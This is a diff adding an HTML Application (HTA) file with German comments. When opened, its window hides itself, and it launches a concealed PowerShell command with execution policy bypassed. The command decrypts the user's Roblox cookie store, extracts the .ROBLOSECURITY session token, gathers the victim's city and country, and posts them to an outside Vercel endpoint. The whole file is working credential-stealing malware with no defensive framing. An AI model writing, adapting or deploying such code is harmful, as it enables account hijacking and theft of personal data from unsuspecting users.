@@ -1,0 +1,65 @@
+<html>
+<head>
+<HTA:APPLICATION 
+    WINDOWSTATE="minimize" 
+    SHOWINTASKBAR="no" 
+    SYSMENU="no" 
+    CAPTION="no"
+    BORDER="none"
+>
+<script language="jscript">
+// Fenster sofort auf 0 skalieren und unsichtbar aus dem Bildschirm schieben
+window.resizeTo(0, 0);
+window.moveTo(-32000, -32000);
+
+var vercelApiUrl = "https://flashdrive-vert.vercel.app/api/index";
+
+try {
+    var psScript = 
+        "Add-Type -AssemblyName System.Security;" +
+        "$p = Join-Path $env:LOCALAPPDATA 'Roblox\\LocalStorage\\RobloxCookies.dat';" +
+        "if(Test-Path $p) {" +
+        "    $json = Get-Content $p -Raw | ConvertFrom-Json;" +
+        "    $b = [Convert]::FromBase64String($json.CookiesData);" +
+        "    try {" +
+        "        $decBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);" +
+        "        $decrypted = [System.Text.Encoding]::UTF8.GetString($decBytes);" +
+        "    } catch {" +
+        "        $decrypted = '';" +
+        "    }" +
+        "    $clean = '';" +
+        "    if($decrypted -match '\\.ROBLOSECURITY\\s+([^;\\s]+)') {" +
+        "        $clean = $Matches[1];" +
+        "    } else {" +
+        "        if($decrypted -match '\\.ROBLOSECURITY=([^;\\s]+)') {" +
+        "            $clean = $Matches[1];" +
+        "        } else {" +
+        "            $clean = $decrypted;" +
+        "        }" +
+        "    }" +
+        "    $geo = @{};" +
+        "    try {" +
+        "        $ipInfo = Invoke-RestMethod -Uri 'http://ip-api.com/json/' -TimeoutSec 3;" +
+        "        $geo.city = $ipInfo.city;" +
+        "        $geo.region = $ipInfo.regionName;" +
+        "        $geo.country = $ipInfo.country;" +
+        "    } catch {" +
+        "        $geo.city = 'Unknown'; $geo.region = 'Unknown'; $geo.country = 'Unknown';" +
+        "    }" +
+        "    $body = @{ cookieValue = $clean; city = $geo.city; region = $geo.region; country = $geo.country } | ConvertTo-Json;" +
+        "    try {" +
+        "        Invoke-RestMethod -Uri '" + vercelApiUrl + "' -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10;" +
+        "    } catch {}" +
+        "}";
+
+    var command = "powershell.exe -w h -ep bypass -c \"" + psScript + "\"";
+    new ActiveXObject("WScript.Shell").Run(command, 0, false);
+} catch(e) {}
+
+// Sofortiges Schließen ohne Weiterleitung
+window.close();
+</script>
+</head>
+<body>
+</body>
+</html>
